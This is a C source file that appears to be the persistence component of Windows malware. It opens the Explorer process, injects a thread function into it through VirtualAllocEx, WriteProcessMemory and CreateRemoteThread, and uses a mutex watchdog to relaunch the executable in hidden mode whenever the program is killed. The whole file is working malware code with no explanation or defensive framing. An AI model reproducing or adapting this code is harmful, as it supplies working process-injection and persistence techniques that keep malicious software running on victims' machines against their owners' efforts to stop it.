#include "include.h"
#include "externs.h"

#define _CRT_SECURE_NO_DEPRECATE 

#include <windows.h> 

#include <stdio.h> 

#pragma comment( lib, "user32" ) 


typedef bool (WINAPI *pCloseHandle)(HANDLE); 

typedef HANDLE (WINAPI *pCreateFileA)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); 

typedef HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR); 

typedef DWORD (WINAPI *pGetLastError)(void); 

typedef bool (WINAPI *pReleaseMutex)(HANDLE); 

typedef void (WINAPI *pSleep)(DWORD); 

typedef UINT (WINAPI *pWinExec)(LPCTSTR, UINT); 


struct SPersistInfo 

{ 
	
	pCloseHandle m_fCloseHandle; 
	
	pCreateFileA m_fCreateFileA; 
	
	pCreateMutexA m_fCreateMutexA; 
	
	pGetLastError m_fGetLastError; 
	
	pReleaseMutex m_fReleaseMutex; 
	
	pSleep m_fSleep; 
	
	pWinExec m_fWinExec; 
	
	char m_szFilePath[MAX_PATH]; 
	
	char m_szMutexName[512]; 
	
}; 


DWORD WINAPI persist_thread(SPersistInfo *s_pi) 

{ 
	
	HANDLE hFile, hMutex; 
	
	
	hFile = s_pi->m_fCreateFileA(s_pi->m_szFilePath, 
		
		GENERIC_READ, 
		
		FILE_SHARE_READ, 
		
		NULL, 
		
		OPEN_EXISTING, 
		
		FILE_ATTRIBUTE_NORMAL, 
		
		NULL); 
	
	
	while (TRUE) 
		
	{ 
		
		hMutex = s_pi->m_fCreateMutexA(NULL, FALSE, s_pi->m_szMutexName); 
		
		
		if (s_pi->m_fGetLastError() != ERROR_ALREADY_EXISTS) 
			
		{ 
			
			s_pi->m_fCloseHandle(hFile); 
			
			s_pi->m_fReleaseMutex(hMutex); 
			
			s_pi->m_fCloseHandle(hMutex); 
			
			s_pi->m_fWinExec(s_pi->m_szFilePath, SW_HIDE); 
			
			return 0; 
			
		} 
		
		
		s_pi->m_fReleaseMutex(hMutex); 
		
		s_pi->m_fCloseHandle(hMutex); 
		
		s_pi->m_fSleep(60000); 
		
	} 
	
	
	return 0; 
	
} 


void persist_calc(void) {} 

int persist_main(char *pszMutexName) 

{ 
	
	char szFilePath[MAX_PATH]; 
	
	DWORD dwPID, dwWritten, *pdwRemoteCode; 
	
	HANDLE hProcess; 
	
	HMODULE hModule; 
	
	int nSize; 
	
	
	hModule = GetModuleHandle("kernel32.dll"); 
	
	
	SPersistInfo *s_pir, s_pil = 
		
	{ 
		
		(pCloseHandle)GetProcAddress(hModule, "CloseHandle"), 
			
			(pCreateFileA)GetProcAddress(hModule, "CreateFileA"), 
			
			(pCreateMutexA)GetProcAddress(hModule, "CreateMutexA"), 
			
			(pGetLastError)GetProcAddress(hModule, "GetLastError"), 
			
			(pReleaseMutex)GetProcAddress(hModule, "ReleaseMutex"), 
			
			(pSleep)GetProcAddress(hModule, "Sleep"), 
			
			(pWinExec)GetProcAddress(hModule, "WinExec"), 
			
	}; 
	
	
	GetWindowThreadProcessId(FindWindow("Shell_TrayWnd", NULL), &dwPID); 
	
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 
	
	
	if (!hProcess) return FALSE; 
	
	
	GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1); 
	
	strncpy(s_pil.m_szFilePath, szFilePath, sizeof(s_pil.m_szFilePath) - 1); 
	
	strncpy(s_pil.m_szMutexName, pszMutexName, sizeof(s_pil.m_szMutexName) - 1); 
	
	
	s_pir = (SPersistInfo *)VirtualAllocEx(hProcess, 
		
		NULL, 
		
		sizeof(SPersistInfo), 
		
		MEM_COMMIT, 
		
		PAGE_READWRITE); 
	
	
	WriteProcessMemory(hProcess, s_pir, &s_pil, sizeof(SPersistInfo), &dwWritten); 
	
	nSize = ((LPBYTE)persist_calc - (LPBYTE)persist_thread); 
	
	
	pdwRemoteCode = (PDWORD)VirtualAllocEx(hProcess, 
		
		NULL, 
		
		nSize, 
		
		MEM_COMMIT, 
		
		PAGE_EXECUTE_READWRITE); 
	
	
	WriteProcessMemory(hProcess, pdwRemoteCode, &persist_thread, nSize, &dwWritten); 
	
	
	HANDLE g_hPersistThread; 
	
	g_hPersistThread = CreateRemoteThread(hProcess, 
		
		NULL, 
		
		0, 
		
		(LPTHREAD_START_ROUTINE)pdwRemoteCode, 
		
		s_pir, 
		
		0, 
		
		NULL); 
	
	
	CloseHandle(hProcess); 
	
	
	if (!g_hPersistThread) return FALSE; 
	
	
	return TRUE; 
	
} 


